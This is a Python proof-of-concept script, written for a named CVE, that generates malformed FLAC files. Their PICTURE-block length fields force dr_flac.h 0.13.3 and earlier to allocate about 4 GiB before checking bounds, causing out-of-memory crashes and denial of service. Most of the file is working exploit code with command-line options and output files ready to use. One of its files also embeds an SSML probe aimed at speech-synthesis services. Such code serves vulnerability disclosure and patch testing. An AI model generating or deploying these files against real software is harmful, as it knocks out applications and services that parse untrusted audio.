#!/usr/bin/env python3
"""
SIREN v3.0 - CVE-2026-32836 Precise PoC Generator
==================================================
Researcher: frankSx
Date: 2026-09-23

Generates weaponized FLAC files targeting the uncontrolled memory allocation
in dr_libs dr_flac.h <= 0.13.3, drflac__read_and_decode_metadata().

ROOT CAUSE (dr_flac.h:6750 / :6772):
    pMime = malloc(mimeLength + 1);          // line 6750 - ALLOCATION FIRST
    if (blockSizeRemaining < mimeLength ...) // line 6756 - bounds check AFTER

mimeLength / descriptionLength are attacker-controlled 32-bit big-endian
fields inside the PICTURE metadata block. The allocation happens BEFORE the
remaining-block-size check, so a 78-byte file forces malloc(0xFFFFFFFF)
(~4 GiB). Only reachable via drflac_open_*_with_metadata() with a non-NULL
onMeta callback (dr_flac.h:6728 gate).

Fixed in upstream commits fefced4, 4f5a4cd, 663239a.
CWE-789 | CVSS:4.0 6.9 (AV:L/AC:L/AT:N/PR:N/UI:N/VA:H)

For authorized security research only.
"""
import argparse, hashlib, struct, sys

# Largest non-wrapping value: 0xFFFFFFFF would wrap +1 to 0 (malloc(0))
SAFE_MAX = 0xFFFFFFFE

def streaminfo_block():
    return bytes([0x00]) + (0x22).to_bytes(3, "big") + bytes(34)

def picture_block(mime_len, desc_len=None, last=True):
    """PICTURE metadata block with attacker-controlled length fields.
    Declared block size stays tiny (32 bytes) - the parser mallocs the
    attacker lengths before ever comparing them to blockSizeRemaining."""
    body = (3).to_bytes(4, "big")                # pictureType: Cover (front)
    body += mime_len.to_bytes(4, "big")          # mimeLength  -> malloc at :6750
    if desc_len is not None:                     # descriptionLength -> :6772
        body += desc_len.to_bytes(4, "big")
    body += bytes(32 - len(body))                # pad to declared 32
    hdr = (0x80 if last else 0x00) | 0x06        # last-flag | type PICTURE(6)
    return bytes([hdr]) + len(body).to_bytes(3, "big") + body

def vorbis_comment_ssml():
    """SIREN v2 carrier preserved: adaptive SSML probe in vendor string."""
    ssml = ('<?xml version="1.0"?><probe><google><voice name="en-US-Studio-O"/></google>'
            '<aws><amazon:domain name="news"/></aws>'
            '<azure><mstts:express-as style="cheerful"/></azure>'
            '<openai><emphasis level="strong"/></openai></probe>').encode()
    body = len(ssml).to_bytes(4, "little") + ssml + (0).to_bytes(4, "little")
    return bytes([0x04]) + len(body).to_bytes(3, "big") + body

def build_minimal(mime_len=SAFE_MAX):
    """78-byte standalone reproducer (mirrors dr_libs issue #298 repro_main.c)."""
    p = bytearray(78)
    p[0:4] = b"fLaC"
    p[4] = 0x00; p[5:8] = (0x22).to_bytes(3, "big")      # STREAMINFO
    p[42] = 0x86; p[43:46] = (0x20).to_bytes(3, "big")   # last PICTURE, len 32
    p[50:54] = mime_len.to_bytes(4, "big")               # mimeLength @ offset 50
    return bytes(p)

def build_polyglot(mime_len=SAFE_MAX, desc_len=SAFE_MAX):
    """Full SIREN v3.0: valid FLAC identity + SSML carrier + dual-stage
    CVE-2026-32836 PICTURE exhaustion (mime AND description fields)."""
    out = bytearray(b"fLaC")
    out += streaminfo_block()
    out += vorbis_comment_ssml()
    out += picture_block(mime_len, desc_len, last=True)
    out += b"\xff\xf8" + bytes(64)                        # frame sync placeholder
    return bytes(out)

def main():
    ap = argparse.ArgumentParser(description="SIREN v3.0 CVE-2026-32836 PoC generator")
    ap.add_argument("--mode", choices=["minimal", "polyglot", "both"], default="both")
    ap.add_argument("--mime-length", type=lambda x: int(x, 0), default=SAFE_MAX,
                    help="mimeLength field (default 0xFFFFFFFE = 4 GiB alloc)")
    ap.add_argument("--desc-length", type=lambda x: int(x, 0), default=SAFE_MAX,
                    help="descriptionLength field (polyglot mode)")
    ap.add_argument("-o", "--outdir", default=".")
    a = ap.parse_args()

    if a.mime_length == 0xFFFFFFFF or a.desc_length == 0xFFFFFFFF:
        print("[!] 0xFFFFFFFF wraps +1 to 0 (malloc(0)); use 0xFFFFFFFE for max effect")

    written = []
    if a.mode in ("minimal", "both"):
        d = build_minimal(a.mime_length)
        fn = f"{a.outdir}/siren_v3_cve-2026-32836_minimal_78B.flac"
        open(fn, "wb").write(d); written.append((fn, d))
    if a.mode in ("polyglot", "both"):
        d = build_polyglot(a.mime_length, a.desc_length)
        fn = f"{a.outdir}/siren_v3.0.polyglot.flac"
        open(fn, "wb").write(d); written.append((fn, d))

    for fn, d in written:
        print(f"[+] {fn}  ({len(d)} bytes)  sha256:{hashlib.sha256(d).hexdigest()}")
    print("\n[*] Expected result on dr_flac <= 0.13.3 with metadata callback:")
    print("    malloc(4294967295) at dr_flac.h:6750 -> OOM kill / ASan abort / DoS")
    print("[*] Patched builds (fefced4+): bounds check fires first, open returns NULL")

if __name__ == "__main__":
    main()
